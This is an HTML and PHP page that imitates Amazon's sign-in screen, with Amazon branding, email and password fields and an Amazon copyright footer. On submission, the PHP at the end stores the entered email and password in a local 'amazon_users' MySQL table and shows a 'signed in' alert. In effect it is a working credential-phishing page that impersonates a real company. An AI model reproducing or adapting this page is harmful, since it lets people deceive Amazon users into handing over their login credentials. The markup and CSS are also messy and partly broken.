<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <title>Amazon sign in</title>
    <style>
        {
    
            margin: 0;
            padding: 0;
            box-sizing:border-box;
            text-decoration:none;
            font-family: "Amazon Ember", Arial, sans-serif;
        }
        body{
            display: flex;
            flex-direction: column;
            justify-content:center;
            align-items:center;

        }
        header{
            margin: 2px;
            height:10vh;
            width:100%;
            display:flex;
            flex-wrap:wrap;
            justify-content:center;
        }
        header div{
            height: 100px;
            width:100;
        
        }
        header div img{
            height:60%;
            width:100%;
        }

        .main {
            margin:5px;
            height:70vh; 
            width: 100%;
            display:flex;
            justify-content:center;
        }
        footer{
            margin:5px;
            height:10vh; 
            width: 100%;
            display:flex;
            justify-content:center;
            flex-direction: column;
            align-items:center;

        }
        .items{
            margin:5px;
            height: 96%; 
            width: 28%;
            border:2px solid rgb(221, 221, 221);
            box-shadow:0 0 2px rgb(228, 224, 224);
            display: flex;
            
    
            flex-direction: column;
            border-radius: 5px;
         
        }
        .items h3{
            margin:1rem;
            margin-bottom:1;
            width:90%;
            font-size:xx-large;
            font-weight:400;
            font-family: "Amazon Ember", Arial, sans-serif;
        }
        .items label{
            
            margin:0.9rem;
            margin-bottom:0;
            width:90%;
            font-weight: 600;
            font-family: "Amazon Ember", Arial, sans-serif;
            
        }
        .items label 1{
            
            margin:0.9rem;
            margin-bottom:0;
            width:90%;
            font-weight: 600;
            font-family: "Amazon Ember", Arial, sans-serif;
            
        }
        .items div input{
            margin:1rem;
            height: 30px;
            width:90%;
            border-radius:8px;
          
            
        }
         .items .but1 input{
            margin:1rem;
            height:100%
            width:300px%;
            border-radius:8px;
            background-color: yellow;
            color: black;
            border: none;
            cursor: pointer;  
        

         }
         .items p{
            margin:1rem;
            height:5%;
            width:90%;
            font-size:14px;
            font-family: "Amazon Ember", Arial, sans-serif;
            
            
         }
         .items p a{
            color: #2162a1;
         }
         .item p a:hover{
            text-decoration: underline;
         }
         .Dropdown h5{
            color: #2162a1;
            margin:1rem;
            cursor: pointer;
            margin-bottom:0;
            font-family: "Amazon Ember", Arial, sans-serif;
            
         }
         .Dropdown a{
            display: block;
            color: #2162a1;
            cursor:pointer;
            margin:0 1rem;
            font-size:small;
            font-family: "Amazon Ember", Arial, sans-serif;
            
        
         }
         .Dropdown:hover{
            text-decoration:underline;
         }
         .Dropdown:hover .child{
            display:block;
         }
        .info h4{
            margin:1rem;
            margin-top: 0;
            height:10%;
            color: #2162a1;
        }
        .info a{
            margin: 1rem;
            margin-top:0;
            height: 10%;
            font-size:small;
            text-decoration: none;
            color: #2162a1;
            font-family: "Amazon Ember", Arial, sans-serif;
            
        }
         .info a:hover{
            text-decoration:underline;
         }
      #hr{
        margin: 1rem;
        width:90%;
      }
      .center{
        height: 8vh;
        width: 28%;
        display:flex;
        flex-direction: column;
        align-items: center;
      }
       .center h5{
        min-width:350px;
        text-align:center;
        position: relative;
        margin:auto;
        color: rgb(158, 155, 155);

       }     
       .center h5::after,
       .center h5::before{
        content:"";
        height:2px;
        width:120px;
        display:block;
        background-color:rgb(158, 155, 155);
        position: absolute;
        top:50%;

       }
       .center h5::after{
        right:0;
       }
       .center h5::before{
        left: 0;
       }
       .btn{
        height: 100%;
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;

       }     
        .btn button{
            height:100%;
            width:100%;
            border-radius: 50px;
            border: 1px solid rgb(126, 126, 126);
            background-color: white;
            cursor:pointer;
        }
        .link{
            height: 100px;
            width: 22%;
            display:flex;
            justify-content: space-evenly;
            align-items: center;
        }
        .link a{
            font-size: small;
            font-weight: 200px;
            font-family: "Amazon Ember", Arial, sans-serif;
            color: #2162a1;
            text-decoration: none;
        }
        .link a:hover{
            text-decoration:underline;
        }
        
        .but1{
        @media screen and (max-width: 800px;)
            .items{
                width:60%;

            }
            .center {
                width:60%;
            }
            .links{
                width:60%;
            }

        }

        .but1{
            max-width: 100%;
            margin-left: auto;
            margin-right: auto;
        }
        .items submit{
            width: 390px;
            background-color: yellow;
            border: 2px solid yellow;
            border-radius: 20px;
            height: 40px;
        }


        
        
    </style>
    <script>
        $(document).ready(function(){
            $(".child").hide();
            $("#needh").click(function(){
                $(".child").toggle("slow");
            });
        });

    </script>
</head>
<body>
    <header>
        <main>
        <div>
            <img src="logo.jpg">
           
    </header>

    <div class="items">
        <h3>Sign in</h3>
    
  <form action="index.php" method="POST">      
 <label>Email or mobile phone number</label>
<div class = "input"><input type="text" name="email"></div>
<label 1>Enter Passward</label 1>
<div class ="input"><input type="text" name="pass"></div>
<div class="but1"><input type="submit" value="Continue"></div>
</form>

<p>By continuing, you agree to Amazon's 
<a href="#">Conditions of Use</a>
and <a href="#">Privacy Notice</a>
</p>
<div class="Dropdown">
    <h5 id='needh'>  Need help? </h5>
    <div class="child">
        <a href="#">Forgot password</a>
        <a href="#">other issue with sign-In</a>
    </div>
        <hr id="hr">
    </div>
        <div class="info">
        <h4>
        
            Buying for work
    </h4>
    </a>
            
                <a href="#">
                    Shop on Amazon Business
                
        
            </a>
    </div>
</div>
    </main>
    <div class="center">
        <h5>
        New to Amazon?
        </h5>
        
        <title>Amazon Login Button</title>
        
<body>

<div class="btn">
    <a href="Create.php">

        <button>Login with your Amazon account</button>
    </a>
</div>



</body>
</html>

        </div>
    <hr>
    <footer>
        <div class="link">
        <a href="#">Condition of use</a> 
        <a href="#">Privacy Notice</a>
        <a href="#">Help</a>
        </div>
        <h5>
        © 1996-2025, Amazon.com, Inc. or its affiliates
        </h5>
    
    </footer>

            

            
            
    <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $servername = "localhost";
            $username = "root";
            $password = "";
            $dbname = "amazon_users";

            // Create connection
            $conn = new mysqli($servername, $username, $password, $dbname);

            // Check connection
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }

            // Get form data
            
            $email = $_POST['email'];
            $phone = $_POST['pass'];

            // Prepare and bind
            $stmt = $conn->prepare("INSERT INTO users(name, password) VALUES (?, ?)");
            $stmt->bind_param("ss", $email, $phone);

            // Execute the statement
            if ($stmt->execute()) {
                echo "<script>alert('signed in')</script>";
            } else {
                echo "<script>alert('".$stmt->error."')</script>";
            }

            // Close the connection
            $stmt->close();
            $conn->close();
        }
        ?>

</body>
</html>